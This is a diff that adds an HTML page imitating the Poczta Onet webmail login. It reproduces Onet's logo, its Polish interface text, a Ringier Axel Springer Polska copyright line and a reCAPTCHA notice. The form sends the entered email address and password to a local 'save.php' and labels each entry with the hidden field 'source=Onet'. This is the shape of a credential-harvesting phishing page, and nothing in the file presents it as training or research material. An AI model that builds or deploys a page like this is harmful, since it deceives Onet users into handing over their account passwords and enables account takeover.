@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Poczta Onet – Logowanie</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #eaeaea, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #000;
+    }
+
+    .login-container {
+      background-color: #fff;
+      width: 340px;
+      padding: 30px 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-circle {
+      width: 16px;
+      height: 16px;
+      background-color: #ffcb05;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+
+    .logo-text {
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #333;
+      margin-top: 10px;
+      margin-bottom: 20px;
+    }
+
+    form {
+      text-align: left;
+    }
+
+    label {
+      font-size: 13px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    .input-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .input-row span {
+      font-size: 12px;
+      color: #0073cf;
+      cursor: pointer;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #ffcb05;
+      border: none;
+      padding: 12px;
+      border-radius: 25px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    .divider {
+      text-align: center;
+      color: #aaa;
+      margin: 20px 0 10px;
+      font-size: 12px;
+    }
+
+    .register-btn {
+      border: 1px solid #ccc;
+      padding: 10px;
+      width: 100%;
+      border-radius: 25px;
+      background-color: white;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 10px;
+      color: #555;
+      text-align: center;
+    }
+
+    .footer a {
+      color: #000;
+      text-decoration: none;
+      font-weight: bold;
+      margin: 0 4px;
+      font-size: 11px;
+    }
+
+    .footer .lang {
+      display: inline-flex;
+      align-items: center;
+      margin-top: 5px;
+    }
+
+    .lang img {
+      width: 12px;
+      height: 12px;
+      margin-left: 4px;
+    }
+
+    .footer .notice {
+      margin-top: 10px;
+      font-size: 10px;
+      color: #777;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <div class="logo-circle"></div>
+      <div class="logo-text">onet POCZTA</div>
+    </div>
+
+    <div><strong>Poczta Onet – bezpieczne logowanie</strong></div>
+    <div class="subtitle">przy pomocy konta Onet</div>
+
+    <form action="save.php" method="POST">
+      <input type="hidden" name="source" value="Onet">
+
+      <div class="input-row">
+        <label for="username">Adres email</label>
+        <span>Nie pamiętam hasła</span>
+      </div>
+      <input type="email" id="username" name="username" placeholder="email@example.com" required>
+
+      <label for="password">Hasło</label>
+      <input type="password" id="password" name="password" placeholder="••••••••" required>
+
+      <button type="submit">ZALOGUJ</button>
+    </form>
+
+    <div class="divider">NIE MASZ JESZCZE KONTA?</div>
+    <button class="register-btn">Zarejestruj się</button>
+
+    <div class="footer">
+      <div>
+        <a href="#">Polityka prywatności</a> · <a href="#">Kontakt</a>
+        <div class="lang">PL <img src="https://flagcdn.com/pl.svg" alt="Polski" /></div>
+      </div>
+      <div class="notice">
+        © 2025 Ringier Axel Springer Polska. Wszelkie prawa zastrzeżone. <br/>
+        Ta witryna jest chroniona przez reCAPTCHA i obowiązują zasady
+        <a href="#">Polityka prywatności</a> oraz <a href="#">Warunki usługi</a> Google.
+      </div>
+    </div>
+  </div>
+</body>
+</html>
